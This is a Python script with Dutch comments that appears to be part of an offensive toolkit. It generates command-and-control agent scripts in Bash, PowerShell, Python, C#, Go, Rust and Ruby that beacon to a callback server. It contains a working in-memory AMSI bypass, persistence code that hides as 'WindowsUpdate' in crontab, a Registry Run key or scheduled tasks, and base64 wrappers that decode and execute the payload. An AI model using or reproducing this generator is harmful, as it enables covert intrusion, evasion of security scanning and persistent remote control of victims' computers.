#!/usr/bin/python3
# Agent generator — genereert standalone C2 agent scripts

import base64
import re

from meuk.hacksec import *

_TEMPLATES = {
    "bash":       ("meuk/template/agent_bash.sh",        "agent.sh"),
    "powershell": ("meuk/template/agent_powershell.ps1", "agent.ps1"),
    "python":     ("meuk/template/agent_python.txt",     "agent.py"),
    "csharp":     ("meuk/template/agent_csharp.cs",      "agent.cs"),
    "go":         ("meuk/template/agent_go.go",          "agent.go"),
    "rust":       ("meuk/template/agent_rust.rs",        "agent.rs"),
    "ruby":       ("meuk/template/agent_ruby.rb",        "agent.rb"),
}

# ---------------------------------------------------------------------------
# Feature code snippets
# ---------------------------------------------------------------------------

# Proxy — systeem proxy (automatische detectie)
_PROXY_SYSTEM = {
    "bash": "",  # curl leest automatisch env vars
    "powershell": (
        "# Proxy setup (systeem)\n"
        "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()\n"
        "[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials"
    ),
    "python": "",  # urllib gebruikt automatisch env vars
    "csharp": "",  # HttpClient gebruikt automatisch systeem proxy
    "go": "",      # net/http leest automatisch env vars
    "rust": "",    # curl leest automatisch env vars
    "ruby": "",    # Net::HTTP leest automatisch env vars
}

# Proxy — handmatige URL
_PROXY_MANUAL = {
    "bash": (
        "# Proxy setup\n"
        'export http_proxy="PROXY_URL"\n'
        'export https_proxy="PROXY_URL"'
    ),
    "powershell": (
        "# Proxy setup\n"
        '$proxy = New-Object System.Net.WebProxy("PROXY_URL")\n'
        "[System.Net.WebRequest]::DefaultWebProxy = $proxy"
    ),
    "python": (
        "# Proxy setup\n"
        '_ph=ProxyHandler({"http":"PROXY_URL","https":"PROXY_URL"})\n'
        "install_opener(build_opener(_ph))"
    ),
    "csharp": (
        "// Proxy setup\n"
        'handler.Proxy = new WebProxy("PROXY_URL");'
    ),
    "go": (
        "// Proxy setup\n"
        'os.Setenv("HTTP_PROXY", "PROXY_URL")\n'
        'os.Setenv("HTTPS_PROXY", "PROXY_URL")'
    ),
    "rust": (
        "// Proxy setup\n"
        'let proxy_arg = "--proxy PROXY_URL";'
    ),
    "ruby": (
        "# Proxy setup\n"
        'ENV["http_proxy"] = ENV["https_proxy"] = "PROXY_URL"'
    ),
}

# AMSI bypass — alleen PowerShell
_AMSI_CODE = (
    '# AMSI bypass\n'
    '$w=@"\n'
    'using System;using System.Runtime.InteropServices;\n'
    'public class W{\n'
    '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);\n'
    '[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);\n'
    '[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);\n'
    '}\n'
    '"@\n'
    'Add-Type $w\n'
    '$l=[W]::LoadLibrary("am"+"si.dll")\n'
    '$a=[W]::GetProcAddress($l,"Am"+"siSc"+"anBuffer")\n'
    '$p=0;[W]::VirtualProtect($a,[uint32]5,0x40,[ref]$p)\n'
    '[System.Runtime.InteropServices.Marshal]::Copy([Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3),0,$a,6)'
)

# Persistentie snippets — key: "{language}_{method}"
_PERSIST_SNIPPETS = {
    "bash_crontab": (
        '# Persistentie: crontab\n'
        'SCRIPT_PATH=$(readlink -f "$0" 2>/dev/null || echo "$0")\n'
        '(crontab -l 2>/dev/null | grep -v "$SCRIPT_PATH"; echo "*/5 * * * * $SCRIPT_PATH") | crontab - 2>/dev/null'
    ),
    "powershell_registry": (
        '# Persistentie: Registry Run key\n'
        '$sp = $MyInvocation.MyCommand.Path\n'
        'if ($sp) { New-ItemProperty -Path \'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\' '
        '-Name \'WindowsUpdate\' -Value "powershell -ep bypass -w hidden -f `"$sp`"" -Force | Out-Null }'
    ),
    "powershell_schtasks": (
        '# Persistentie: Scheduled Task\n'
        '$sp = $MyInvocation.MyCommand.Path\n'
        'if ($sp) { schtasks /create /tn "WindowsUpdate" /tr "powershell -ep bypass -w hidden -f `"$sp`"" '
        '/sc onlogon /ru $env:USERNAME /f 2>$null | Out-Null }'
    ),
    "python_crontab": (
        '# Persistentie: crontab\n'
        'import sys as _s\n'
        '_sp=os.path.abspath(_s.argv[0])\n'
        'os.system(f\'(crontab -l 2>/dev/null | grep -v "{_sp}"; echo "*/5 * * * * python3 {_sp}") | crontab - 2>/dev/null\')'
    ),
    "python_registry": (
        '# Persistentie: Registry Run key\n'
        'import sys as _s\n'
        '_sp=os.path.abspath(_s.argv[0])\n'
        'try:\n'
        '    import winreg\n'
        '    _k=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,winreg.KEY_SET_VALUE)\n'
        '    winreg.SetValueEx(_k,"WindowsUpdate",0,winreg.REG_SZ,f\'pythonw "{_sp}"\')\n'
        '    winreg.CloseKey(_k)\n'
        'except Exception:pass'
    ),
    "python_schtasks": (
        '# Persistentie: Scheduled Task\n'
        'import sys as _s\n'
        '_sp=os.path.abspath(_s.argv[0])\n'
        'os.system(f\'schtasks /create /tn "WindowsUpdate" /tr "pythonw \\\\"{_sp}\\\\"" /sc onlogon /ru %USERNAME% /f 2>nul\')'
    ),
    "csharp_registry": (
        '// Persistentie: Registry Run key\n'
        'try {\n'
        '    var exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;\n'
        '    if (!string.IsNullOrEmpty(exePath))\n'
        '        Microsoft.Win32.Registry.SetValue(\n'
        '            @"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",\n'
        '            "WindowsUpdate", exePath);\n'
        '} catch {}'
    ),
    "csharp_schtasks": (
        '// Persistentie: Scheduled Task\n'
        'try {\n'
        '    var exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;\n'
        '    if (!string.IsNullOrEmpty(exePath))\n'
        '        Process.Start("schtasks", $"/create /tn \\"WindowsUpdate\\" /tr \\"{exePath}\\" /sc onlogon /ru {Environment.UserName} /f")?.WaitForExit(5000);\n'
        '} catch {}'
    ),
    "go_crontab": (
        '// Persistentie: crontab\n'
        'if ep, err := os.Executable(); err == nil {\n'
        '\texec.Command("bash", "-c", fmt.Sprintf(`(crontab -l 2>/dev/null | grep -v "%s"; echo "*/5 * * * * %s") | crontab - 2>/dev/null`, ep, ep)).Run()\n'
        '}'
    ),
    "go_schtasks": (
        '// Persistentie: Scheduled Task\n'
        'if ep, err := os.Executable(); err == nil {\n'
        '\texec.Command("schtasks", "/create", "/tn", "WindowsUpdate", "/tr", ep, "/sc", "onlogon", "/f").Run()\n'
        '}'
    ),
    "rust_crontab": (
        '// Persistentie: crontab\n'
        'if let Ok(ep) = std::env::current_exe() {\n'
        '    let ep = ep.display().to_string();\n'
        '    let _ = Command::new("bash").args(&["-c", &format!("(crontab -l 2>/dev/null | grep -v \\"{}\\"; echo \\"*/5 * * * * {}\\") | crontab - 2>/dev/null", ep, ep)]).output();\n'
        '}'
    ),
    "ruby_crontab": (
        '# Persistentie: crontab\n'
        'sp = File.expand_path($0)\n'
        'system(%(bash -c \'(crontab -l 2>/dev/null | grep -v "#{sp}"; echo "*/5 * * * * ruby #{sp}") | crontab - 2>/dev/null\'))'
    ),
}

# Welke persistentie methoden zijn geldig per taal
_PERSIST_VALID = {
    "bash": ["crontab"],
    "powershell": ["registry", "schtasks"],
    "python": ["crontab", "registry", "schtasks"],
    "csharp": ["registry", "schtasks"],
    "go": ["crontab", "schtasks"],
    "rust": ["crontab"],
    "ruby": ["crontab"],
}

# Killdate check snippets per taal
_KILLDATE_SNIPPETS = {
    "bash":       'if [ "$(date +%Y-%m-%d)" \\> "KILLDATE" ]; then exit 0; fi',
    "powershell": 'if ((Get-Date) -gt [datetime]"KILLDATE") { exit }',
    "python":     '    if __import__("datetime").date.today()>__import__("datetime").date.fromisoformat("KILLDATE"):exit()',
    "csharp":     'if (DateTime.Now > DateTime.Parse("KILLDATE")) Environment.Exit(0);',
    "go":         'if time.Now().Format("2006-01-02") > "KILLDATE" { os.Exit(0) }',
    "rust":       'if String::from_utf8(Command::new("date").args(&["+%Y-%m-%d"]).output().map(|o|o.stdout).unwrap_or_default()).unwrap_or_default().trim() > "KILLDATE" { std::process::exit(0); }',
    "ruby":       'exit if Date.today > Date.parse("KILLDATE")',
}


def _obfuscate(script, language):
    """Wrap het hele script in een base64 decode+exec one-liner."""
    b64 = base64.b64encode(script.encode()).decode()
    if language == "bash":
        return f"echo {b64} | base64 -d | bash"
    elif language == "powershell":
        b64_utf16 = base64.b64encode(script.encode("utf-16-le")).decode()
        return f"powershell -enc {b64_utf16}"
    elif language == "python":
        return f'import base64;exec(base64.b64decode("{b64}"))'
    elif language == "ruby":
        return f'ruby -e "require \'base64\';eval(Base64.decode64(\'{b64}\'))"'
    return script


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

parser = argparse.ArgumentParser()
parser.add_argument("callback", help="IB server callback URL (bijv. http://10.0.0.1:5000)")
parser.add_argument("language", help="agent taal", choices=_TEMPLATES.keys())
parser.add_argument("--freq", default="3", help="poll frequentie in seconden")
parser.add_argument("--label", default="", help="script type label (standaard: agent-{language})")
parser.add_argument("--amsi", action="store_true", help="AMSI bypass (alleen PowerShell)")
parser.add_argument("--obfuscate", action="store_true", help="Base64 obfuscatie")
parser.add_argument("--persist", choices=["crontab", "registry", "schtasks"], help="persistentie methode")
parser.add_argument("--proxy", nargs="?", const="system", default="", help="proxy (leeg=systeem, of URL)")
parser.add_argument("--jitter", type=int, default=0, help="jitter percentage (0-50)")
parser.add_argument("--killdate", default="", help="kill date (YYYY-MM-DD)")
parser.add_argument("--retry-max", type=int, default=5, help="max backoff multiplier (1=uit)")
args = parser.parse_args()

# CLI validatie
if args.persist and args.persist not in _PERSIST_VALID.get(args.language, []):
    parser.error(f"Persistentie '{args.persist}' is niet beschikbaar voor {args.language}")
if args.amsi and args.language != "powershell":
    parser.error("AMSI bypass is alleen beschikbaar voor PowerShell")
if args.jitter < 0 or args.jitter > 50:
    parser.error("Jitter moet tussen 0 en 50 liggen")
if args.killdate:
    import datetime
    try:
        datetime.date.fromisoformat(args.killdate)
    except ValueError:
        parser.error("Killdate moet in YYYY-MM-DD formaat zijn")
if args.retry_max < 1 or args.retry_max > 20:
    parser.error("Retry-max moet tussen 1 en 20 liggen")

label = args.label or f"agent-{args.language}"
tmpl_path, out_name = _TEMPLATES[args.language]

template = lezen(tmpl_path)
script = template.replace("[CALLBACK]", args.callback)
script = script.replace("[FREQ]", args.freq)
script = script.replace("[LABEL]", label)

# [PROXY_SETUP]
if args.proxy:
    if args.proxy == "system":
        script = script.replace("[PROXY_SETUP]", _PROXY_SYSTEM[args.language])
    else:
        script = script.replace("[PROXY_SETUP]", _PROXY_MANUAL[args.language].replace("PROXY_URL", args.proxy))
else:
    script = script.replace("[PROXY_SETUP]", "")

# [AMSI_BYPASS] — alleen PowerShell
if args.amsi and args.language == "powershell":
    script = script.replace("[AMSI_BYPASS]", _AMSI_CODE)
else:
    script = script.replace("[AMSI_BYPASS]", "")

# [PERSIST_CODE]
if args.persist:
    key = f"{args.language}_{args.persist}"
    snippet = _PERSIST_SNIPPETS.get(key, "")
    script = script.replace("[PERSIST_CODE]", snippet)
else:
    script = script.replace("[PERSIST_CODE]", "")

# [JITTER] en [RETRY_MAX]
script = script.replace("[JITTER]", str(args.jitter))
script = script.replace("[RETRY_MAX]", str(args.retry_max))

# [KILLDATE_CHECK]
if args.killdate:
    script = script.replace("[KILLDATE_CHECK]",
        _KILLDATE_SNIPPETS[args.language].replace("KILLDATE", args.killdate))
else:
    script = script.replace("[KILLDATE_CHECK]", "")

# Placeholder cleanup — verwijder overbodige lege regels
script = re.sub(r'\n\s*\n\s*\n', '\n\n', script)

# Obfuscatie: wrap hele script in base64
if args.obfuscate:
    script = _obfuscate(script, args.language)

output_path = f"http/payloads/{out_name}"
schrijven(output_path, script)
print(f"[+] Agent script geschreven naar: {output_path}")
